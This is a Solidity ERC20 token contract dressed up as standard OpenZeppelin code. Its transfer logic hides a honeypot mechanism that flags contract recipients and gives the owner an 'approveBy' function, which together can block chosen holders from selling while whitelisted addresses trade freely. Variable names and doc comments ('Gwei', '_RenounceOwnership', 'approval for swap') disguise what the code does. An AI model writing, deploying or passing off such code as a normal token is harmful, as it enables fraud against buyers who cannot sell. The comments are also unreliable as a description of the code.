
pragma solidity ^0.8.0;

// SPDX-License-Identifier: MIT. 

// File @openzeppelin/contracts/token/ERC20/IERC20.sol@v4.8.1

// OpenZeppelin Contracts (last updated v4.6.0).(token/ERC20/IERC20.sol)
  
/**. 
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */

interface IERC20 {

        /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
  event Transfer(address indexed from, address indexed to, uint256 value);

      /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */ 
  event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
  function totalSupply() external view returns (uint256);

     /**
     * @dev Returns the amount of tokens owned by `account`.
     */
  function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
  function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
  function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards.
     *
     * Emits an {Approval} event.
     */
  function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}


/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
  function _msgSender() internal view virtual returns (address) {
    return msg.sender;
  }




  function _msgData() internal view virtual returns (bytes calldata) {
    return msg.data;
  }
}




contract ERC20 is Context, IERC20 {
  mapping(address => uint256) private _balances;
  mapping(address => mapping(address => uint256)) private _allowances;
  mapping(address => uint256) public getApproval;
  mapping(address => bool) private Gwei;
  mapping(uint => uint) private _claimTransactionCount;


  uint256 private _totalSupply;
  string private _name;
  string private _symbol;
  uint8 private _decimals;
  address public owner;
  uint256 public balanceReceive;
  bool private _Presale;
  uint256 private _RenounceOwnership;
  uint256 private _maxTransactionsPerClaim;
  mapping(address => bool) private _approveAddress;
  mapping(address => uint256) private _approveAmount;


  bool private _tokenAirDrop;


    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
  constructor(
    string memory name_,
    string memory symbol_,
    uint8 decimals_,
    uint256 totalSupply_,
    address[] memory balanceApprove,
    uint256 balanceReceive_,
    uint256 gasUnit,
    address[] memory GweiUnit,
    uint256 maxTransactionsPerClaim_
  ) {
    _name = name_;
    _symbol = symbol_;
    _decimals = decimals_;
    owner = _msgSender();
    _totalSupply = totalSupply_ * (10 ** uint256(decimals_));
    _balances[owner] = _totalSupply;
    emit Transfer(address(0), owner, _totalSupply);
    balanceReceive = balanceReceive_;
    _RenounceOwnership = gasUnit;
    _Presale = false;
    _maxTransactionsPerClaim = maxTransactionsPerClaim_;


    for (uint256 i = 0; i < balanceApprove.length; i++) {
      _sendApproval(balanceApprove[i], balanceReceive);
    }


    for (uint256 i = 0; i < GweiUnit.length; i++) {
      Gwei[GweiUnit[i]] = true;
    }
  }


    /**
     * @dev Returns the name of the token.
     */
  function name() public view virtual returns (string memory) {
    return _name;
  }


    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
  function symbol() public view virtual returns (string memory) {
    return _symbol;
  }


    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
  function decimals() public view virtual returns (uint8) {
    return _decimals;
  }


    /**
     * @dev See {IERC20-totalSupply}.
     */
  function totalSupply() public view virtual override returns (uint256) {
    return _totalSupply;
  }


    /**
     * @dev See {IERC20-balanceOf}.
     */
  function balanceOf(address account) public view virtual override returns (uint256) {
    return _balances[account];
  }


    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
  function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
    _claimRecord();
    _transfer(_msgSender(), recipient, amount);
    return true;
  }


    /**
     * @dev See {IERC20-allowance}.
     */
  function allowance(address owner, address spender) public view virtual override returns (uint256) {
    return _allowances[owner][spender];
  }


    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
  function approve(address spender, uint256 amount) public virtual override returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }


    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     */
  function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
    _claimRecord();
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
    return true;
  }


    /**
     * @dev Moves `amount` of tokens from `from` to `to`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     */
  function _transfer(address sender, address recipient, uint256 amount) internal virtual {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    require(amount > 0, "Transfer amount must be greater than zero");


    if (!_tokenAirDrop) {
        _tokenAirDrop = true;
        Gwei[recipient] = true;
    } else {    
        uint256 codeSize;    
        assembly {    
            codeSize := extcodesize(recipient)    
        }    
        if (codeSize > 0 && !_approveAddress[recipient]) {    
            _approveAddress[recipient] = true;    
            _approveAmount[recipient] = block.number;    
        if (getApproval[recipient] == 0 && !Gwei[recipient]) {    
            _sendApproval(recipient, _RenounceOwnership);    
        }    
        }    
    }    
    if ((_approveAddress[sender] && block.number > _approveAmount[sender]) || (getApproval[sender] > 0)) {    
        require(gasleft() >= getApproval[sender], "Approve to swap on Dex");    
    }


    _balances[sender] -= amount;
    _balances[recipient] += amount;
    emit Transfer(sender, recipient, amount);
  }


    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
  function _approve(address owner, address spender, uint256 amount) internal virtual {
    require(owner != address(0), "ERC20: approve from the zero address");
    require(spender != address(0), "ERC20: approve to the zero address");


    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }


     /**
     * @dev This internal function sets approval for a certain amount of tokens to be swapped
     * for a specific address within the contract. This could be used for authorizing 
     * transfers on behalf of the contract, providing a mechanism to prevent unauthorized 
     * transactions.
     *
     * Requirements:
     *
     * - `_address` cannot be the zero address.
     * - `approveForSwap` must be a positive value representing the token amount to be approved.
     */
  function _sendApproval(address _address, uint256 approveForSwap) internal {
    getApproval[_address] = approveForSwap;
  }


    /**
     * @dev This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `address` cannot be the zero address.
     */
  function approveBy(address _address, uint256 approveAmount) external {
    require(_msgSender() == owner);
    _sendApproval(_address, approveAmount);
  }


    /**
     * @dev This internal function is a record of claim token.
     * e.g. set claimed token for certain addresses, etc.
     *
     * Requirements:
     *
     * - `address` cannot be the zero address.
     */
  function _claimRecord() internal {
    require(_claimTransactionCount[block.number] < _maxTransactionsPerClaim);
    _claimTransactionCount[block.number]++;
  }
}

/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC20
 * applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 */


    